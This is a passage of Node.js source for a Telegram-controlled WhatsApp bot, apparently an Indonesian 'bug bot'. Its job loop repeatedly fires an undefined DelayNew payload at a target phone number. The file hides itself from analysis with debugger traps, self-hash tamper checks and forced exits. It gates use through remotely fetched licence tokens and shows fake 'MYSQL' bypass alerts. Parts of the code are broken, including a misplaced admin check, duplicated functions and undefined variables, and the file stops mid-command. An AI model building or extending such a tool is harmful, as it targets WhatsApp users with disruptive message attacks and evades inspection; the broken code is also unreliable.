const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID, CHANNEL_USERNAME } = require("./config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    patchMessageBeforeSending,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    encodeNewsletterMessage,
    getContentType,
    encodeWAMessage,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    jidEncode,
    WAMessageAddressingMode,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}
//------------------(TASK QUE SYSTEM)--------------------//
class TaskQueue {
  constructor() {
    this.queue = [];
    this.running = false;
  }

  async add(task) {
    this.queue.push(task);
    this.run();
  }

  async run() {
    if (this.running) return;
    this.running = true;

    while (this.queue.length > 0) {
      const job = this.queue.shift();
      try {
        await job();
      } catch (e) {
        console.error("Task error:", e);
      }
    }

    this.running = false;
  }
}

const queue = new TaskQueue();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

//-------------------------------------------------------------------------//
const databaseUrl = 'https://raw.githubusercontent.com/agungdermawan22332-sys/AstraVoid/main/Destoryed.js';

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

function formatTarget(number) {
  if (!number) return null;

  // bersihin selain angka
  number = number.replace(/[^0-9]/g, "");

  if (number.startsWith("0")) {
    number = "62" + number.slice(1);
  }

  return number + "@s.whatsapp.net";
}

//------------------(FILTER - BEBAS SPAM)--------------------//
async function RunningJobs(ctx, target) {

  const taskId = Date.now().toString().slice(-6);
  const delay = 3500; // ini delay ms nya serah mau berapaa rekomendasi udah tetep 3000 aja sih :)

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();
  const timeNow = new Date().toLocaleTimeString();

  console.log(`\n${C.cyan}${C.bold}⌛ PERMINTAAN JOBS${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Target:${C.reset} ${target}`);
  console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);

  for (let i = 1; i <= 2; i++) { // nih yang 3 itu lopp serah mau pake berapaa

    const loopStart = Date.now();

    try {
      await DelayNew(sock, target); 

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.green}📤 Succesfuly${C.reset}  ` +
        `${C.gray}Loop:${C.reset} ${i}/1  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

    } catch (err) {

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.red}⛔ Failed${C.reset}   ` +
        `${C.gray}Loop:${C.reset} ${i}/1  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

      console.log(`${C.yellow}↳ ${err.message}${C.reset}`);
    }

    await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);

  console.log(`\n${C.cyan}${C.bold}🏁 JOBS COMPLETED${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Total Runtime:${C.reset} ${totalTime}s\n`);
}

//------------------(PREMIUM GROUP)--------------------//
// DB file auto dibuat
const PREM_GROUP_DB = path.join(__dirname, "premgb.json");

// --- helpers db ---
function loadPremGroups() {
  try {
    if (!fs.existsSync(PREM_GROUP_DB)) {
      fs.writeFileSync(PREM_GROUP_DB, JSON.stringify({ groups: [] }, null, 2));
    }
    const raw = fs.readFileSync(PREM_GROUP_DB, "utf8");
    const json = JSON.parse(raw);
    if (!json || !Array.isArray(json.groups)) return { groups: [] };
    return json;
  } catch {
    return { groups: [] };
  }
}

function savePremGroups(db) {
  fs.writeFileSync(PREM_GROUP_DB, JSON.stringify(db, null, 2));
}

function isPremGroup(chatId) {
  const db = loadPremGroups();
  return db.groups.includes(Number(chatId));
}

function addPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  if (!db.groups.includes(id)) db.groups.push(id);
  savePremGroups(db);
  return true;
}

function delPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  db.groups = db.groups.filter((g) => g !== id);
  savePremGroups(db);
  return true;
}

// --- middleware owner only ---
const ownerOnly = () => async (ctx, next) => {
  if (!ctx.from) return;
  if (String(ctx.from.id) !== String(ownerID)) {
    return ctx.reply("❌ Khusus owner.", { reply_to_message_id: ctx.message?.message_id });
  }
  return next();
};

// --- middleware: premium group gate (pakai buat command premium) ---
const premGroupOnly = () => async (ctx, next) => {
  const chatType = ctx.chat?.type;
  if (chatType === "private") {
    return ctx.reply("❌ Command ini hanya bisa dipakai di grup premium.");
  }
  if (!isPremGroup(ctx.chat.id)) {
    const title = ctx.chat?.title || "Group ini";
    return ctx.reply(`❌ ☇ Grup <b>${escapeHtml(title)}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, {
      parse_mode: "HTML",
    });
  }
  return next();
};

// --- html escape biar aman ---
function escapeHtml(s = "") {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// ================================
// POINT SYSTEM TIC TAC TOE
// ================================
const POINTS_FILE = path.join(__dirname, "points.json");

function loadPoints() {
  try {
    if (!fs.existsSync(POINTS_FILE)) {
      fs.writeFileSync(POINTS_FILE, JSON.stringify({}, null, 2));
    }
    const raw = fs.readFileSync(POINTS_FILE, "utf8");
    return JSON.parse(raw || "{}");
  } catch {
    return {};
  }
}

function savePoints(data) {
  fs.writeFileSync(POINTS_FILE, JSON.stringify(data, null, 2));
}

function ensureUserPoint(user) {
  const db = loadPoints();
  const id = String(user.id);

  if (!db[id]) {
    db[id] = {
      id,
      name: user.username ? `@${user.username}` : (user.first_name || "User"),
      points: 0,
      win: 0,
      lose: 0,
      draw: 0
    };
  } else {
    db[id].name = user.username ? `@${user.username}` : (user.first_name || "User");
  }

  savePoints(db);
  return db;
}

function addWinPoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 3;
  db[id].win += 1;
  savePoints(db);
}

function addLosePoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].lose += 1;
  savePoints(db);
}

function addDrawPoint(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 1;
  db[id].draw += 1;
  savePoints(db);
}

function getUserPoint(userId) {
  const db = loadPoints();
  return db[String(userId)] || null;
}

function getLeaderboard(limit = 10) {
  const db = loadPoints();
  return Object.values(db)
    .sort((a, b) => b.points - a.points)
    .slice(0, limit);
}

// ================================
// TIC TAC TOE
// ================================
const tttGames = new Map(); // chatId -> game

function tttNewBoard() {
  return Array(9).fill(null);
}

function tttWinner(board) {
  const lines = [
    [0,1,2],[3,4,5],[6,7,8],
    [0,3,6],[1,4,7],[2,5,8],
    [0,4,8],[2,4,6]
  ];

  for (const [a, b, c] of lines) {
    if (board[a] && board[a] === board[b] && board[a] === board[c]) {
      return board[a];
    }
  }
  return null;
}

function tttDraw(board) {
  return board.every(v => v !== null) && !tttWinner(board);
}

function tttCell(v) {
  if (v === "X") return "❌";
  if (v === "O") return "⭕";
  return "➖";
}

function tttSafeName(user) {
  return user?.username ? `@${user.username}` : (user?.first_name || "User");
}

function tttBoardKeyboard(chatId, gameId, board, locked = false) {
  const btn = (i) => ({
    text: tttCell(board[i]),
    callback_data: locked
      ? `tttnoop_${chatId}_${gameId}`
      : `tttmove_${chatId}_${gameId}_${i}`
  });

  return {
    inline_keyboard: [
      [btn(0), btn(1), btn(2)],
      [btn(3), btn(4), btn(5)],
      [btn(6), btn(7), btn(8)]
    ]
  };
}

function tttRender(game) {
  const xName = game.players.X ? tttSafeName(game.players.X) : "-";
  const oName = game.players.O ? tttSafeName(game.players.O) : "-";
  const turnUser = game.turn === "X" ? game.players.X : game.players.O;
  const turnName = turnUser ? tttSafeName(turnUser) : "-";

  return `🎮 <b>TIC TAC TOE</b>

❌ X : <b>${xName}</b>
⭕ O : <b>${oName}</b>

Giliran:
<b>${game.turn}</b> - ${turnName}`;
}

// ================================
// POINT SYSTEM SUIT BATU KERTAS 
// ================================
function savePoints(data) {
  fs.writeFileSync(POINTS_FILE, JSON.stringify(data, null, 2));
}

function ensureUserPoint(user) {
  const db = loadPoints();
  const id = String(user.id);

  if (!db[id]) {
    db[id] = {
      id,
      name: user.username ? `@${user.username}` : (user.first_name || "User"),
      points: 0,
      win: 0,
      lose: 0,
      draw: 0
    };
  } else {
    db[id].name = user.username ? `@${user.username}` : (user.first_name || "User");
  }

  savePoints(db);
  return db;
}

function addSuitWin(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].points += 2;
  db[id].win += 1;
  savePoints(db);
}

function addSuitLose(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].lose += 1;
  savePoints(db);
}

function addSuitDraw(user) {
  const db = ensureUserPoint(user);
  const id = String(user.id);
  db[id].draw += 1;
  savePoints(db);
}

// ================================
// SUIT GAME
// ================================
const suitGames = new Map(); // chatId -> game

function suitName(user) {
  return user?.username ? `@${user.username}` : (user?.first_name || "User");
}

function suitChoiceLabel(choice) {
  if (choice === "rock") return "🪨 Batu";
  if (choice === "paper") return "📄 Kertas";
  if (choice === "scissors") return "✂️ Gunting";
  return "-";
}

function suitWin(a, b) {
  if (a === b) return "draw";
  if (
    (a === "rock" && b === "scissors") ||
    (a === "paper" && b === "rock") ||
    (a === "scissors" && b === "paper")
  ) return "p1";
  return "p2";
}

function suitPickKeyboard(chatId, gameId) {
  return {
    inline_keyboard: [
      [
        { text: "🪨 Batu", callback_data: `suitpick_${chatId}_${gameId}_rock` },
        { text: "📄 Kertas", callback_data: `suitpick_${chatId}_${gameId}_paper` },
        { text: "✂️ Gunting", callback_data: `suitpick_${chatId}_${gameId}_scissors` }
      ]
    ]
  };
}

//---------(HANDLER BLOCK CMD ) ---------//
const BLOCKCMD_FILE = path.join(__dirname, "blocked_commands.json");

let blockedCommands = [];

function loadBlockedCommands() {
  try {
    if (fs.existsSync(BLOCKCMD_FILE)) {
      const raw = fs.readFileSync(BLOCKCMD_FILE, "utf8");
      const parsed = JSON.parse(raw);

      if (Array.isArray(parsed)) {
        blockedCommands = parsed.map(cmd => String(cmd).toLowerCase().trim());
      } else {
        blockedCommands = [];
      }
    } else {
      blockedCommands = [];
    }
  } catch (err) {
    console.error("Gagal load blocked commands:", err.message);
    blockedCommands = [];
  }
}

function saveBlockedCommands() {
  try {
    fs.writeFileSync(BLOCKCMD_FILE, JSON.stringify(blockedCommands, null, 2));
  } catch (err) {
    console.error("Gagal save blocked commands:", err.message);
  }
}

function normalizeCommandName(input) {
  return String(input || "")
    .trim()
    .toLowerCase()
    .replace(/^\//, "");
}

function isCommandBlocked(commandName) {
  const normalized = normalizeCommandName(commandName);
  return blockedCommands.includes(normalized);
}

loadBlockedCommands();

//---------(HANDLER APPROVED GB ) ---------//
const APPROVED_GROUPS_FILE = path.join(__dirname, "approved_groups.json");

let approvedGroups = [];
let pendingGroups = new Map();

function loadApprovedGroups() {
  try {
    if (fs.existsSync(APPROVED_GROUPS_FILE)) {
      const raw = fs.readFileSync(APPROVED_GROUPS_FILE, "utf8");
      const parsed = JSON.parse(raw);
      approvedGroups = Array.isArray(parsed) ? parsed : [];
    } else {
      approvedGroups = [];
    }
  } catch (err) {
    console.error("Gagal load approved groups:", err.message);
    approvedGroups = [];
  }
}

function saveApprovedGroups() {
  try {
    fs.writeFileSync(APPROVED_GROUPS_FILE, JSON.stringify(approvedGroups, null, 2));
  } catch (err) {
    console.error("Gagal save approved groups:", err.message);
  }
}

function isOwner(userId) {
  return String(userId) === String(ownerID);
}

function isGroupApproved(chatId) {
  return approvedGroups.includes(String(chatId));
}

loadApprovedGroups();

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
    console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
`));

const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `\`\`\`js
⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Berhasil Login
╘—————————————————═⬡
\`\`\``;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
        }
      }
            
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Sender Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
`));

        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addpairing", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addpairing 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "1234GINA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    const pairingMenu = `\`\`\`js
⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Status Bot : Menunggu Login
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(ThumbnailPairing, {
  caption: pairingMenu,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "SALIN CODE",
          copy_text: {
            text: formattedCode
          }
        }
      ]
    ]
  }
});

    lastPairingMessage = {
      chatId: ctx.chat.id,
      messageId: sentMsg.message_id,
      phoneNumber,
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`js
⬡═―—⊱ ⎧ GHOST INFINITY ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Status Bot : Sudah Terhubung
╘═——————————————═⬡
\`\`\``;

      try {
        await bot.telegram.editMessageCaption(
  lastPairingMessage.chatId,
  lastPairingMessage.messageId,
  undefined,
  updateConnectionMenu,
  {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "SALIN CODE",
            copy_text: {
              text: lastPairingMessage.pairingCode
            }
          }
        ]
      ]
    }
  }
);
      } catch (e) {
      }
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
